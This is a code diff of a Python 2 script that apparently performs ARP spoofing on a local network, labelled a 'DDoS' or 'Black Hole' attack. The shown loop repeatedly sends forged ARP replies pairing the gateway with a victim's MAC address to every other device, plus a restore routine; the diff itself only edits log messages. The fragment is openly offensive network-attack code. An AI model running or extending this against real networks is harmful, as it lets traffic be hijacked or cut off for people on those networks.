@@ -245,19 +245,18 @@ def ddos():
 
     while True:
         try:
-            #print "device count=%d" % device_count
             for item in device_list:
                 target_IP = item["IP"]
                 target_MAC = item["MAC"]
                 if target_IP != victim_IP:
-                    print "target IP=%s, target MAC=%s\n" % (target_IP, target_MAC)
+                    print "...target IP=%s, target MAC=%s..." % (target_IP, target_MAC)
                     spoof_ddos(gateway_IP, target_IP, victim_MAC, target_MAC)
             time.sleep(3)
 
         except BaseException as e:
             print "[Exception] %s %s" % (type(e), str(e))
             restore_ddos(gateway_IP, victim_IP)
-            print "[Info.] Black Hole attack is over."
+            print "[Info.] DDoS attack is over."
             print "[Info.] Program is shutting down."
             sys.exit(1)
 
@@ -272,7 +271,7 @@ def restore_ddos(gateway_IP, victim_IP):
     print "[Info.] Please wait for a while."
     print "[Info.] Sending real ARP replies to all devices..."
     for item in device_list:
-        print "item=%s" % item
+        print "device info: %s" % item
         target_IP = item["IP"]
         target_MAC = item["MAC"]
         if target_IP != victim_IP:
